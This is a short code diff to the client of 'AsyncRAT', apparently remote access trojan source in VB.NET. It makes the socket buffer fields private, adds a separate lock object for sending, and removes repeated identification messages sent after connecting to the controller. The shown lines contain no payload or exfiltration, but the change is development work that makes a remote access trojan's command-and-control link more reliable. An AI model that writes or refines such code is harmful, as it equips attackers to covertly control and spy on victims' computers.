@@ -71,12 +71,14 @@ Namespace AsyncRAT
 
         Public Shared isConnected As Boolean = False
         Public Shared S As Socket = Nothing
-        Public Shared BufferLength As Long = Nothing
-        Public Shared BufferLengthReceived As Boolean = False
-        Public Shared Buffer() As Byte
-        Public Shared MS As MemoryStream = Nothing
-        Public Shared Tick As Threading.Timer = Nothing
+        Private Shared BufferLength As Long = Nothing
+        Private Shared BufferLengthReceived As Boolean = False
+        Private Shared Buffer() As Byte
+        Private Shared MS As MemoryStream = Nothing
+        Private Shared Tick As Threading.Timer = Nothing
         Public Shared allDone As New ManualResetEvent(False)
+        Private Shared SendSync As Object = Nothing
+
 
         Public Shared Sub Main()
 
@@ -141,12 +143,8 @@ Namespace AsyncRAT
                 Debug.WriteLine("Connect : Connected")
 
                 isConnected = True
-
+                SendSync = New Object()
                 SendIdentification()
-                SendIdentification()
-                SendIdentification()
-                SendIdentification()
-
                 S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
 
                 Dim T As New TimerCallback(AddressOf Ping)
@@ -219,7 +217,7 @@ Namespace AsyncRAT
         End Sub
 
         Public Shared Sub Send(ParamArray Msgs As Object())
-            SyncLock S
+            SyncLock SendSync
                 If isConnected = True Then
                     Try
                         Dim Packer As New Pack
